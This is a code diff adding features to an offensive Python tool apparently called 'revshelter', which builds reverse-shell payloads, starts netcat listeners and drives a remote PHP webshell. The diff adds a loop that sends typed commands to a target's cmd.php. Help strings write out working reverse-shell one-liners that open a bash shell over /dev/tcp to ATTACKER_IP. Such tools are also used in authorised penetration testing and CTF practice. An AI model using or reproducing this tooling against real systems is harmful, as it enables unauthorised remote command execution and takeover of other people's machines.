@@ -9,10 +9,13 @@ import netifaces
 import subprocess
 import re
 import random
+import sys
+import requests
 
 # Defining xterm-256color for usage in the script. Compatible for linux only.
 bold = "\033[1m"
 green = "\033[32m"
+white = "\033[37m"
 purple = "\033[95m"
 red = "\033[91m"
 blue = "\033[34m"
@@ -38,7 +41,7 @@ parser = argparse.ArgumentParser(description=f"""
 /____/_/ /_/\___/_/\__/\___/_/     
 
 {end}{bold}{red}To boldly catch shells even the size of a meteorite.      
-{end}{bold}{orange}Version: v1.0.5 - 07/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=RawTextHelpFormatter)
+{end}{bold}{orange}Version: v1.1.0 - 08/04/21 - Bides Das @Xyan1d3 {end}""",formatter_class=RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -46,7 +49,7 @@ web = subparser.add_parser("web",help="Webshell interactor")
 webrev = subparser.add_parser("webrev",help="Webshell to Revshell")
 host = subparser.add_parser("host",help="Copies a revershell file in pwd and hosts it and copies the ip to your clipboard")
 
-rev_sub = rev.add_subparsers(title="Available Payloads",dest='sub')
+rev_sub = rev.add_subparsers(title="Available Payloads",dest='sub',help=False)
 bash = rev_sub.add_parser("bash",help="echo base64_encoded_bash-i_payload |base64 -d|bash")
 bashi = rev_sub.add_parser("bashi",help="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1")
 bash196 = rev_sub.add_parser("bash196",help="0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; bash <&196 >&196 2>&196")
@@ -102,6 +105,13 @@ py2export.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=i
 pyexport.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
 socat.add_argument("-p",help="PORT for reverse shell.",metavar="8888",type=int)
 
+web.add_argument("url",help="Target URL [http://127.0.0.1/cmd.php]",metavar="URL")
+web.add_argument("-f",help="Filename of the webshell [Default : cmd.php]. Incase you enter only ip in url arg.")
+web.add_argument("-p",help="GET parameter to send commands.[Default: cmd]")
+web.add_argument("--ssl",help="Force HTTPS",action="store_true")
+web.add_argument("--nossl",help="Force downgrade to HTTP",action="store_true")
+
+
 args = parser.parse_args()
 
 def fetch_ip(): # This function IP of the NIC [default:tun0]
@@ -154,6 +164,13 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
     if language == "": # If the language parameter of this function is detected it will fallback to base64'ed bash.
         return payloads["bash"]
     return payloads[language] # Returns reverseshell payload from the dictionary by slapping in ATTACKERIP and ATTACKERPORT.
+def Invoke_Webshell(url):
+    while True:
+        cmd = input(f"{bold}{purple}rev{green}shelter> {end}{bold}{orange}")
+        print(f"{end}",end="")
+        r = requests.get(f"{url}{requests.utils.quote(cmd)}")
+        print(r.text)
+        
 def shell_handler(port,proto): # shell_handler invokes a netcat listener it takes port to listen on and protocol UDP/TCP
     if proto.lower() == "tcp":
         os.system(f"nc -lvnp {fetch_port()}") # Invoking netcat as TCP listener
@@ -161,6 +178,10 @@ def shell_handler(port,proto): # shell_handler invokes a netcat listener it take
         os.system(f"nc -luvnp {fetch_port()}") # Invoking netcat with UDP support
 
 
+
+
+if len(sys.argv) == 1:
+    parser.print_help()
 
 if args.module == "rev": # Checks for 1st pos arg if its rev.
     if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
@@ -200,3 +221,29 @@ if args.module == "rev": # Checks for 1st pos arg if its rev.
         pyperclip.copy(payload)
         shell_handler(fetch_port(),"tcp")
 
+
+if args.module == "web":
+    if not bool(re.match("^http://|https://",args.url)) and not bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)):
+        if args.ssl and args.nossl:
+            aerr(f"{bold}{white}A tight slap to you for slapping --ssl & --nossl together.")
+            exit()
+        elif args.ssl:
+            args.url = "https://" + args.url
+        elif args.nossl or not args.ssl and not args.nossl:
+            args.url = "http://" + args.url
+    if bool(re.match("^http://|https://",args.url)): # Checks whether http or https is present in the url entered.
+        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+$",args.url)): # This if regex checks for url like http://127.0.0.1 and makes them http://127.0.0.1/
+            args.url += "/"
+        if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/",args.url)): # This if regex checks for url like https://127.0.0.1/ or http://127.0.0.1/
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9.]+/$",args.url)): # This regex checks if it has the filename path in the url else it injects cmd.php of the -f parameter.
+                if args.f == None: # Checks for the -f arg for filename if not supplied it puts default cmd.php there.
+                    args.url += "cmd.php"
+                elif args.f != None: # If -f arg is supplied it will inject the filename from the parameter and put it in the url.
+                    args.url += args.f
+            if bool(re.match("^(http://|https://)[a-zA-Z0-9./]+$",args.url)): # Checks if the url has the args parameter present else injects ?cmd= or the data added with -p flag.
+                if args.p == None: # It checks for the -p flag if the parameter is not supplied it on default will add ?cmd= to url.
+                    args.url += "?cmd="
+                elif args.p != None: # If the -f flag is supplied it will be injected to the url as a parameter ?arg=
+                    args.url += f"?{args.p}="
+    # The url is prepared for doing whatever we want to do.
+    Invoke_Webshell(args.url)
